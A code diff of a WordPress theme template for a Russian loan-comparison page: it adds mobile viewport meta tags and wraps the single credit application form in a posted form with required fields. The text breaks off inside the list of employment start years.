@@ -16,6 +16,9 @@
 <!--<![endif]-->
 <head>
     <?php wp_head(); ?>
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <link rel='stylesheet' id='dashicons-css'
           href='https://xn-----6kccbugwdmdcrtidm5a5byn.xn--p1ai/wp-includes/css/dashicons.min.css?ver=4.9.3'
           type='text/css' media='all'/>
@@ -660,658 +663,667 @@
         <link rel="stylesheet" href="<?= get_template_directory_uri(); ?>/assets/front/css/sravni-style.css">
         <div id="credit-selection" class="_13jtz kTe6a _2iOJW _3ZGrV only-this-form" data-reactid="260">
             <div data-reactid="261">
-                <div class="_1mn3x">
-                    <div class="NIyzu _3dK9S _1TAj_">Единая заявка на кредит</div>
-                </div>
-                <div class="_1LQWv ER4_X">
-                    <div class="_1miZw _1rUOp">
-                        <div class="_1CBZx">
-                            <div class="_3ITGU">
-                                <div class="_31J-9 _16jhA" data-test="ui-input"><label class="_1oupA _2IwHh"
-                                                                                       for="amount">Сумма
-                                        кредита</label>
-                                    <div class="_3FIbJ"><input type="text" placeholder="Сумма" autocomplete="off"
-                                                               autocorrect="off" autocapitalize="off" spellcheck="off"
-                                                               class="_1QIZ8 _3pwdR" role="input" id="amount"
-                                                               name="amount" value=""></div>
-                                </div>
-                            </div>
-                            <div class="_3ITGU">
-                                <div data-test="ui-select" class="_1F9QS" id="period-kr-form-wrap">
-                                    <div class="_31J-9 _3yuTA _16jhA" data-test="ui-select-input"><label
-                                                class="_1oupA _2IwHh" for="period">На какой срок</label>
-                                        <div class="_3FIbJ ">
-                                            <input autocomplete="off" autocorrect="off" autocapitalize="off"
-                                                   spellcheck="off" class="_1QIZ8 _3pwdR _1O6pC"
-                                                   name="period" id="cur_period-kr-form"
-                                                   onclick="select_period_kr_form();"
-                                                   placeholder="Выберите" value="">
-                                            <div class="_390m1 _1sid2 _18XP_ pEdyv _2fl7k"
-                                                 data-test="ui-select-input-icon">
-                                                <svg class="_4fAE4">
-                                                    <use xlink:href="#arrow-down-thin"></use>
-                                                </svg>
-                                            </div>
-                                        </div>
-                                    </div>
-                                    <ul id="period-kr-form" class="_3nnad aDtzb" data-test="ui-select-values">
-                                        <li onclick="select_period_srok_kr_form('1 месяц')" value="P1M" label="1 месяц"
-                                            class="Z96DE _3pzz9" data-test="ui-menu-item">1
-                                            месяц
-                                        </li>
-                                        <li onclick="select_period_srok_kr_form('3 месяца')" value="P3M"
-                                            label="3 месяца" class="Z96DE _3pzz9"
-                                            data-test="ui-menu-item">3 месяца
-                                        </li>
-                                        <li onclick="select_period_srok_kr_form('6 месяцев')" value="P6M"
-                                            label="6 месяцев" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                            6 месяцев
-                                        </li>
-                                        <li onclick="select_period_srok_kr_form('9 месяцев')" value="P9M"
-                                            label="9 месяцев" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                            9 месяцев
-                                        </li>
-                                        <li onclick="select_period_srok_kr_form('1 год')" value="P1Y" label="1 год"
-                                            class="Z96DE _3pzz9" data-test="ui-menu-item">1
-                                            год
-                                        </li>
-                                        <li onclick="select_period_srok_kr_form('2 года')" value="P2Y" label="2 года"
-                                            class="Z96DE _3pzz9" data-test="ui-menu-item">2
-                                            года
-                                        </li>
-                                        <li onclick="select_period_srok_kr_form('3 года')" value="P3Y" label="3 года"
-                                            class="Z96DE _3pzz9" data-test="ui-menu-item">3
-                                            года
-                                        </li>
-                                        <li onclick="select_period_srok_kr_form('4 года')" value="P4Y" label="4 года"
-                                            class="Z96DE _3pzz9" data-test="ui-menu-item">4
-                                            года
-                                        </li>
-                                        <li onclick="select_period_srok_kr_form('5 лет')" value="P5Y" label="5 лет"
-                                            class="Z96DE _3pzz9" data-test="ui-menu-item">5
-                                            лет
-                                        </li>
-                                        <li onclick="select_period_srok_kr_form('6 лет')" value="P6Y" label="6 лет"
-                                            class="Z96DE _3pzz9" data-test="ui-menu-item">6
-                                            лет
-                                        </li>
-                                        <li onclick="select_period_srok_kr_form('7 лет')" value="P7Y" label="7 лет"
-                                            class="Z96DE _3pzz9" data-test="ui-menu-item">7
-                                            лет
-                                        </li>
-                                        <li onclick="select_period_srok_kr_form('8 лет')" value="P8Y" label="8 лет"
-                                            class="Z96DE _3pzz9" data-test="ui-menu-item">8
-                                            лет
-                                        </li>
-                                        <li onclick="select_period_srok_kr_form('9 лет')" value="P9Y" label="9 лет"
-                                            class="Z96DE _3pzz9" data-test="ui-menu-item">9
-                                            лет
-                                        </li>
-                                        <li onclick="select_period_srok_kr_form('10 лет')" value="P10Y" label="10 лет"
-                                            class="Z96DE _3pzz9" data-test="ui-menu-item">10
-                                            лет
-                                        </li>
-                                        <li onclick="select_period_srok_kr_form('15 лет')" value="P15Y" label="15 лет"
-                                            class="Z96DE _3pzz9" data-test="ui-menu-item">15
-                                            лет
-                                        </li>
-                                        <li onclick="select_period_srok_kr_form('20 лет')" value="P20Y" label="20 лет"
-                                            class="Z96DE _3pzz9" data-test="ui-menu-item">20
-                                            лет
-                                        </li>
-                                    </ul>
-                                </div>
-                            </div>
-                            <div class="_3ITGU">
-                                <div class="_1uHjd" data-test="ui-ajax-suggest">
-                                    <div class="aJPK9">
-                                        <div class="_31J-9 _16jhA" data-test="ui-ajax-suggest-input"><label
-                                                    class="_1oupA _2IwHh" for="region">Город получения</label>
-                                            <div class="_3FIbJ"><input type="text" display="where" direction="down"
-                                                                       autocomplete="off" autocorrect="off"
-                                                                       autocapitalize="off" spellcheck="off"
-                                                                       class="_1QIZ8 _3pwdR" role="input" id="region"
-                                                                       name="region" value="Москва"></div>
-                                        </div>
-                                        <div class="UfXw4">
-                                            <div class="">
-                                                <ul class="_3nnad _2Hwhb" data-test="ui-ajax-suggest-suggestions"></ul>
-                                            </div>
-                                        </div>
+                <form action="/" method="post" id="static-form">
+                    <div class="_1mn3x">
+                        <div class="NIyzu _3dK9S _1TAj_">Единая заявка на кредит</div>
+                    </div>
+                    <div class="_1LQWv ER4_X">
+                        <div class="_1miZw _1rUOp">
+                            <div class="_1CBZx">
+                                <div class="_3ITGU">
+                                    <div class="_31J-9 _16jhA" data-test="ui-input"><label class="_1oupA _2IwHh"
+                                                                                           for="amount">Сумма
+                                            кредита</label>
+                                        <div class="_3FIbJ"><input required type="text" placeholder="Сумма" autocomplete="off"
+                                                                   autocorrect="off" autocapitalize="off" spellcheck="off"
+                                                                   class="_1QIZ8 _3pwdR" role="input" id="amount"
+                                                                   name="amount" value=""></div>
                                     </div>
                                 </div>
-                            </div>
-                            <div class="_3ITGU">
-                                <div data-test="ui-select" class="_1F9QS" id="employment-type-wrap">
-                                    <div class="_31J-9 _3yuTA _16jhA" data-test="ui-select-input"><label
-                                                class="_1oupA _2IwHh" for="employmentType">Тип занятости</label>
-                                        <div class="_3FIbJ ">
-                                            <input onclick="select_employment_type_kr_form();" autocomplete="off"
-                                                   autocorrect="off" autocapitalize="off"
-                                                   spellcheck="off" class="_1QIZ8 _3pwdR _1O6pC" id="employmentType"
-                                                   name="employmentType" placeholder="Выберите" value="">
-                                            <div class="_390m1 _1sid2 _18XP_ pEdyv _2fl7k"
-                                                 data-test="ui-select-input-icon">
-                                                <svg class="_4fAE4">
-                                                    <use xlink:href="#arrow-down-thin"></use>
-                                                </svg>
-                                            </div>
-                                        </div>
-                                    </div>
-                                    <ul class="_3nnad aDtzb" data-test="ui-select-values">
-                                        <li onclick="select_employment_type_ul_kr_form('Работа по найму');"
-                                            value="Employment" label="Работа по найму" class="Z96DE _3pzz9"
-                                            data-test="ui-menu-item">Работа по найму
-                                        </li>
-                                        <li onclick="select_employment_type_ul_kr_form('Индивидуальный предприниматель');"
-                                            value="IndividualEntrepreneur" label="Индивидуальный предприниматель"
-                                            class="Z96DE _3pzz9" data-test="ui-menu-item">Индивидуальный
-                                            предприниматель
-                                        </li>
-                                        <li onclick="select_employment_type_ul_kr_form('Пенсионер');" value="Pensioner"
-                                            label="Пенсионер" class="Z96DE _3pzz9"
-                                            data-test="ui-menu-item">Пенсионер
-                                        </li>
-                                        <li onclick="select_employment_type_ul_kr_form('Военный');" value="Military"
-                                            label="Военный" class="Z96DE _3pzz9"
-                                            data-test="ui-menu-item">Военный
-                                        </li>
-                                        <li onclick="select_employment_type_ul_kr_form('Не работаю');"
-                                            value="NotWorking" label="Не работаю" class="Z96DE _3pzz9"
-                                            data-test="ui-menu-item">Не работаю
-                                        </li>
-                                    </ul>
-                                </div>
-                            </div>
-                            <div class="_3ITGU">
-                                <div class="_3bjVL _2IwHh">Начало работы на последнем месте</div>
-                                <div class="_2f7dD">
-                                    <div data-test="ui-select" class="_1F9QS _3gqYl custom-width">
-                                        <div class="_31J-9 _3yuTA _16jhA" data-test="ui-select-input">
+                                <div class="_3ITGU">
+                                    <div data-test="ui-select" class="_1F9QS" id="period-kr-form-wrap">
+                                        <div class="_31J-9 _3yuTA _16jhA" data-test="ui-select-input"><label
+                                                    class="_1oupA _2IwHh" for="period">На какой срок</label>
                                             <div class="_3FIbJ ">
-                                                <input autocomplete="off" autocorrect="off" autocapitalize="off"
+                                                <input required autocomplete="off" autocorrect="off" autocapitalize="off"
                                                        spellcheck="off" class="_1QIZ8 _3pwdR _1O6pC"
-                                                       id="lastExperienceStartMonth" name="lastExperienceStartMonth"
-                                                       placeholder="Январь" value="">
-                                                <!--<div class="_390m1 _1sid2 _18XP_ pEdyv _2fl7k"
+                                                       name="period" id="cur_period-kr-form"
+                                                       onclick="select_period_kr_form();"
+                                                       placeholder="Выберите" value="">
+                                                <div class="_390m1 _1sid2 _18XP_ pEdyv _2fl7k"
                                                      data-test="ui-select-input-icon">
                                                     <svg class="_4fAE4">
                                                         <use xlink:href="#arrow-down-thin"></use>
                                                     </svg>
-                                                </div>-->
+                                                </div>
                                             </div>
                                         </div>
-                                        <ul class="_3nnad aDtzb" data-test="ui-select-values">
-                                            <li value="01" label="Январь" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                Январь
+                                        <ul id="period-kr-form" class="_3nnad aDtzb" data-test="ui-select-values">
+                                            <li onclick="select_period_srok_kr_form('1 месяц')" value="P1M" label="1 месяц"
+                                                class="Z96DE _3pzz9" data-test="ui-menu-item">1
+                                                месяц
                                             </li>
-                                            <li value="02" label="Февраль" class="Z96DE _3pzz9 _1kLbN"
-                                                data-test="ui-menu-item">Февраль
+                                            <li onclick="select_period_srok_kr_form('3 месяца')" value="P3M"
+                                                label="3 месяца" class="Z96DE _3pzz9"
+                                                data-test="ui-menu-item">3 месяца
                                             </li>
-                                            <li value="03" label="Март" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                Март
+                                            <li onclick="select_period_srok_kr_form('6 месяцев')" value="P6M"
+                                                label="6 месяцев" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                6 месяцев
                                             </li>
-                                            <li value="04" label="Апрель" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                Апрель
+                                            <li onclick="select_period_srok_kr_form('9 месяцев')" value="P9M"
+                                                label="9 месяцев" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                9 месяцев
                                             </li>
-                                            <li value="05" label="Май" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                Май
+                                            <li onclick="select_period_srok_kr_form('1 год')" value="P1Y" label="1 год"
+                                                class="Z96DE _3pzz9" data-test="ui-menu-item">1
+                                                год
                                             </li>
-                                            <li value="06" label="Июнь" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                Июнь
+                                            <li onclick="select_period_srok_kr_form('2 года')" value="P2Y" label="2 года"
+                                                class="Z96DE _3pzz9" data-test="ui-menu-item">2
+                                                года
                                             </li>
-                                            <li value="07" label="Июль" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                Июль
+                                            <li onclick="select_period_srok_kr_form('3 года')" value="P3Y" label="3 года"
+                                                class="Z96DE _3pzz9" data-test="ui-menu-item">3
+                                                года
                                             </li>
-                                            <li value="08" label="Август" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                Август
+                                            <li onclick="select_period_srok_kr_form('4 года')" value="P4Y" label="4 года"
+                                                class="Z96DE _3pzz9" data-test="ui-menu-item">4
+                                                года
                                             </li>
-                                            <li value="09" label="Сентябрь" class="Z96DE _3pzz9"
-                                                data-test="ui-menu-item">Сентябрь
+                                            <li onclick="select_period_srok_kr_form('5 лет')" value="P5Y" label="5 лет"
+                                                class="Z96DE _3pzz9" data-test="ui-menu-item">5
+                                                лет
                                             </li>
-                                            <li value="10" label="Октябрь" class="Z96DE _3pzz9"
-                                                data-test="ui-menu-item">Октябрь
+                                            <li onclick="select_period_srok_kr_form('6 лет')" value="P6Y" label="6 лет"
+                                                class="Z96DE _3pzz9" data-test="ui-menu-item">6
+                                                лет
                                             </li>
-                                            <li value="11" label="Ноябрь" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                Ноябрь
+                                            <li onclick="select_period_srok_kr_form('7 лет')" value="P7Y" label="7 лет"
+                                                class="Z96DE _3pzz9" data-test="ui-menu-item">7
+                                                лет
                                             </li>
-                                            <li value="12" label="Декабрь" class="Z96DE _3pzz9"
-                                                data-test="ui-menu-item">Декабрь
+                                            <li onclick="select_period_srok_kr_form('8 лет')" value="P8Y" label="8 лет"
+                                                class="Z96DE _3pzz9" data-test="ui-menu-item">8
+                                                лет
+                                            </li>
+                                            <li onclick="select_period_srok_kr_form('9 лет')" value="P9Y" label="9 лет"
+                                                class="Z96DE _3pzz9" data-test="ui-menu-item">9
+                                                лет
+                                            </li>
+                                            <li onclick="select_period_srok_kr_form('10 лет')" value="P10Y" label="10 лет"
+                                                class="Z96DE _3pzz9" data-test="ui-menu-item">10
+                                                лет
+                                            </li>
+                                            <li onclick="select_period_srok_kr_form('15 лет')" value="P15Y" label="15 лет"
+                                                class="Z96DE _3pzz9" data-test="ui-menu-item">15
+                                                лет
+                                            </li>
+                                            <li onclick="select_period_srok_kr_form('20 лет')" value="P20Y" label="20 лет"
+                                                class="Z96DE _3pzz9" data-test="ui-menu-item">20
+                                                лет
                                             </li>
                                         </ul>
                                     </div>
-                                    <div data-test="ui-select" class="_1F9QS _3gqYl">
-                                        <div class="_31J-9 _3yuTA _16jhA" data-test="ui-select-input">
+                                </div>
+                                <div class="_3ITGU">
+                                    <div class="_1uHjd" data-test="ui-ajax-suggest">
+                                        <div class="aJPK9">
+                                            <div class="_31J-9 _16jhA" data-test="ui-ajax-suggest-input"><label
+                                                        class="_1oupA _2IwHh" for="region">Город получения</label>
+                                                <div class="_3FIbJ"><input required type="text" display="where" direction="down"
+                                                                           autocomplete="off" autocorrect="off"
+                                                                           autocapitalize="off" spellcheck="off"
+                                                                           class="_1QIZ8 _3pwdR" role="input" id="region"
+                                                                           name="region" value="Москва"></div>
+                                            </div>
+                                            <div class="UfXw4">
+                                                <div class="">
+                                                    <ul class="_3nnad _2Hwhb" data-test="ui-ajax-suggest-suggestions"></ul>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="_3ITGU">
+                                    <div data-test="ui-select" class="_1F9QS" id="employment-type-wrap">
+                                        <div class="_31J-9 _3yuTA _16jhA" data-test="ui-select-input"><label
+                                                    class="_1oupA _2IwHh" for="employmentType">Тип занятости</label>
                                             <div class="_3FIbJ ">
-                                                <input autocomplete="off" autocorrect="off" autocapitalize="off"
-                                                       spellcheck="off" class="_1QIZ8 _3pwdR _1O6pC"
-                                                       id="lastExperienceStartYear" name="lastExperienceStartYear"
-                                                       placeholder="2018" value="">
-                                                <!--<div class="_390m1 _1sid2 _18XP_ pEdyv _2fl7k"
+                                                <input required onclick="select_employment_type_kr_form();" autocomplete="off"
+                                                       autocorrect="off" autocapitalize="off"
+                                                       spellcheck="off" class="_1QIZ8 _3pwdR _1O6pC" id="employmentType"
+                                                       name="employmentType" placeholder="Выберите" value="">
+                                                <div class="_390m1 _1sid2 _18XP_ pEdyv _2fl7k"
                                                      data-test="ui-select-input-icon">
                                                     <svg class="_4fAE4">
                                                         <use xlink:href="#arrow-down-thin"></use>
                                                     </svg>
-                                                </div>-->
+                                                </div>
                                             </div>
                                         </div>
                                         <ul class="_3nnad aDtzb" data-test="ui-select-values">
-                                            <li value="2018" label="2018" class="Z96DE _3pzz9 _1kLbN"
-                                                data-test="ui-menu-item">2018
+                                            <li onclick="select_employment_type_ul_kr_form('Работа по найму');"
+                                                value="Employment" label="Работа по найму" class="Z96DE _3pzz9"
+                                                data-test="ui-menu-item">Работа по найму
                                             </li>
-                                            <li value="2017" label="2017" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                2017
+                                            <li onclick="select_employment_type_ul_kr_form('Индивидуальный предприниматель');"
+                                                value="IndividualEntrepreneur" label="Индивидуальный предприниматель"
+                                                class="Z96DE _3pzz9" data-test="ui-menu-item">Индивидуальный
+                                                предприниматель
                                             </li>
-                                            <li value="2016" label="2016" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                2016
+                                            <li onclick="select_employment_type_ul_kr_form('Пенсионер');" value="Pensioner"
+                                                label="Пенсионер" class="Z96DE _3pzz9"
+                                                data-test="ui-menu-item">Пенсионер
                                             </li>
-                                            <li value="2015" label="2015" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                2015
+                                            <li onclick="select_employment_type_ul_kr_form('Военный');" value="Military"
+                                                label="Военный" class="Z96DE _3pzz9"
+                                                data-test="ui-menu-item">Военный
                                             </li>
-                                            <li value="2014" label="2014" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                2014
+                                            <li onclick="select_employment_type_ul_kr_form('Не работаю');"
+                                                value="NotWorking" label="Не работаю" class="Z96DE _3pzz9"
+                                                data-test="ui-menu-item">Не работаю
                                             </li>
-                                            <li value="2013" label="2013" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                2013
+                                        </ul>
+                                    </div>
+                                </div>
+                                <div class="_3ITGU">
+                                    <div class="_3bjVL _2IwHh">Начало работы на последнем месте</div>
+                                    <div class="_2f7dD">
+                                        <div data-test="ui-select" class="_1F9QS _3gqYl custom-width">
+                                            <div class="_31J-9 _3yuTA _16jhA" data-test="ui-select-input">
+                                                <div class="_3FIbJ ">
+                                                    <input required autocomplete="off" autocorrect="off" autocapitalize="off"
+                                                           spellcheck="off" class="_1QIZ8 _3pwdR _1O6pC"
+                                                           id="lastExperienceStartMonth" name="lastExperienceStartMonth"
+                                                           placeholder="Январь" value="">
+                                                    <!--<div class="_390m1 _1sid2 _18XP_ pEdyv _2fl7k"
+                                                         data-test="ui-select-input-icon">
+                                                        <svg class="_4fAE4">
+                                                            <use xlink:href="#arrow-down-thin"></use>
+                                                        </svg>
+                                                    </div>-->
+                                                </div>
+                                            </div>
+                                            <ul class="_3nnad aDtzb" data-test="ui-select-values">
+                                                <li value="01" label="Январь" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    Январь
+                                                </li>
+                                                <li value="02" label="Февраль" class="Z96DE _3pzz9 _1kLbN"
+                                                    data-test="ui-menu-item">Февраль
+                                                </li>
+                                                <li value="03" label="Март" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    Март
+                                                </li>
+                                                <li value="04" label="Апрель" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    Апрель
+                                                </li>
+                                                <li value="05" label="Май" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    Май
+                                                </li>
+                                                <li value="06" label="Июнь" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    Июнь
+                                                </li>
+                                                <li value="07" label="Июль" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    Июль
+                                                </li>
+                                                <li value="08" label="Август" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    Август
+                                                </li>
+                                                <li value="09" label="Сентябрь" class="Z96DE _3pzz9"
+                                                    data-test="ui-menu-item">Сентябрь
+                                                </li>
+                                                <li value="10" label="Октябрь" class="Z96DE _3pzz9"
+                                                    data-test="ui-menu-item">Октябрь
+                                                </li>
+                                                <li value="11" label="Ноябрь" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    Ноябрь
+                                                </li>
+                                                <li value="12" label="Декабрь" class="Z96DE _3pzz9"
+                                                    data-test="ui-menu-item">Декабрь
+                                                </li>
+                                            </ul>
+                                        </div>
+                                        <div data-test="ui-select" class="_1F9QS _3gqYl">
+                                            <div class="_31J-9 _3yuTA _16jhA" data-test="ui-select-input">
+                                                <div class="_3FIbJ ">
+                                                    <input required autocomplete="off" autocorrect="off" autocapitalize="off"
+                                                           spellcheck="off" class="_1QIZ8 _3pwdR _1O6pC"
+                                                           id="lastExperienceStartYear" name="lastExperienceStartYear"
+                                                           placeholder="2018" value="">
+                                                    <!--<div class="_390m1 _1sid2 _18XP_ pEdyv _2fl7k"
+                                                         data-test="ui-select-input-icon">
+                                                        <svg class="_4fAE4">
+                                                            <use xlink:href="#arrow-down-thin"></use>
+                                                        </svg>
+                                                    </div>-->
+                                                </div>
+                                            </div>
+                                            <ul class="_3nnad aDtzb" data-test="ui-select-values">
+                                                <li value="2018" label="2018" class="Z96DE _3pzz9 _1kLbN"
+                                                    data-test="ui-menu-item">2018
+                                                </li>
+                                                <li value="2017" label="2017" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    2017
+                                                </li>
+                                                <li value="2016" label="2016" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    2016
+                                                </li>
+                                                <li value="2015" label="2015" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    2015
+                                                </li>
+                                                <li value="2014" label="2014" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    2014
+                                                </li>
+                                                <li value="2013" label="2013" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    2013
+                                                </li>
+                                                <li value="2012" label="2012" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    2012
+                                                </li>
+                                                <li value="2011" label="2011" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    2011
+                                                </li>
+                                                <li value="2010" label="2010" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    2010
+                                                </li>
+                                                <li value="2009" label="2009" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    2009
+                                                </li>
+                                                <li value="2008" label="2008" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    2008
+                                                </li>
+                                                <li value="2007" label="2007" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    2007
+                                                </li>
+                                                <li value="2006" label="2006" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    2006
+                                                </li>
+                                                <li value="2005" label="2005" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    2005
+                                                </li>
+                                                <li value="2004" label="2004" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    2004
+                                                </li>
+                                                <li value="2003" label="2003" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    2003
+                                                </li>
+                                                <li value="2002" label="2002" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    2002
+                                                </li>
+                                                <li value="2001" label="2001" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    2001
+                                                </li>
+                                                <li value="2000" label="2000" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    2000
+                                                </li>
+                                                <li value="1999" label="1999" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1999
+                                                </li>
+                                                <li value="1998" label="1998" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1998
+                                                </li>
+                                                <li value="1997" label="1997" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1997
+                                                </li>
+                                                <li value="1996" label="1996" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1996
+                                                </li>
+                                                <li value="1995" label="1995" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1995
+                                                </li>
+                                                <li value="1994" label="1994" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1994
+                                                </li>
+                                                <li value="1993" label="1993" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1993
+                                                </li>
+                                                <li value="1992" label="1992" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1992
+                                                </li>
+                                                <li value="1991" label="1991" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1991
+                                                </li>
+                                                <li value="1990" label="1990" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1990
+                                                </li>
+                                                <li value="1989" label="1989" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1989
+                                                </li>
+                                                <li value="1988" label="1988" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1988
+                                                </li>
+                                                <li value="1987" label="1987" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1987
+                                                </li>
+                                                <li value="1986" label="1986" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1986
+                                                </li>
+                                                <li value="1985" label="1985" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1985
+                                                </li>
+                                                <li value="1984" label="1984" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1984
+                                                </li>
+                                                <li value="1983" label="1983" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1983
+                                                </li>
+                                                <li value="1982" label="1982" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1982
+                                                </li>
+                                                <li value="1981" label="1981" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1981
+                                                </li>
+                                                <li value="1980" label="1980" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1980
+                                                </li>
+                                                <li value="1979" label="1979" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1979
+                                                </li>
+                                                <li value="1978" label="1978" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1978
+                                                </li>
+                                                <li value="1977" label="1977" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1977
+                                                </li>
+                                                <li value="1976" label="1976" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1976
+                                                </li>
+                                                <li value="1975" label="1975" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1975
+                                                </li>
+                                                <li value="1974" label="1974" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1974
+                                                </li>
+                                                <li value="1973" label="1973" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1973
+                                                </li>
+                                                <li value="1972" label="1972" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1972
+                                                </li>
+                                                <li value="1971" label="1971" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1971
+                                                </li>
+                                                <li value="1970" label="1970" class="Z96DE _3pzz9" data-test="ui-menu-item">
+                                                    1970
+                                                </li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="_3ITGU">
+                                    <div class="_31J-9 _16jhA" data-test="ui-input"><label class="_1oupA _2IwHh"
+                                                                                           for="monthlySalary">Ежемесячный
+                                            доход</label>
+                                        <div class="_3FIbJ"><input required type="text" placeholder="Сумма" autocomplete="off"
+                                                                   autocorrect="off" autocapitalize="off" spellcheck="off"
+                                                                   class="_1QIZ8 _3pwdR" role="input" id="monthlySalary"
+                                                                   name="monthlySalary" value=""></div>
+                                    </div>
+                                </div>
+                                <div class="_3ITGU">
+                                    <div data-test="ui-select" class="_1F9QS" id="creditSecurity-kr-form-wrap">
+                                        <div class="_31J-9 _3yuTA _16jhA" data-test="ui-select-input"><label
+                                                    class="_1oupA _2IwHh" for="creditSecurity">Обеспечение кредита</label>
+                                            <div class="_3FIbJ ">
+                                                <input required onclick="select_creditSecurity_kr_form()" autocomplete="off" autocorrect="off" autocapitalize="off"
+                                                       spellcheck="off" class="_1QIZ8 _3pwdR _1O6pC" id="creditSecurity"
+                                                       name="creditSecurity" placeholder="Выберите">
+                                                <div class="_390m1 _1sid2 _18XP_ pEdyv _2fl7k"
+                                                     data-test="ui-select-input-icon">
+                                                    <svg class="_4fAE4">
+                                                        <use xlink:href="#arrow-down-thin"></use>
+                                                    </svg>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <ul class="_3nnad aDtzb" data-test="ui-select-values">
+                                            <li onclick="select_creditSecurity_ul_kr_form('Без обеспечения')" value="WithoutBail" label="Без обеспечения" class="Z96DE _3pzz9 _1kLbN"
+                                                data-test="ui-menu-item">Без обеспечения
                                             </li>
-                                            <li value="2012" label="2012" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                2012
-                                            </li>
-                                            <li value="2011" label="2011" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                2011
-                                            </li>
-                                            <li value="2010" label="2010" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                2010
-                                            </li>
-                                            <li value="2009" label="2009" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                2009
-                                            </li>
-                                            <li value="2008" label="2008" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                2008
-                                            </li>
-                                            <li value="2007" label="2007" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                2007
-                                            </li>
-                                            <li value="2006" label="2006" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                2006
-                                            </li>
-                                            <li value="2005" label="2005" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                2005
-                                            </li>
-                                            <li value="2004" label="2004" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                2004
-                                            </li>
-                                            <li value="2003" label="2003" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                2003
-                                            </li>
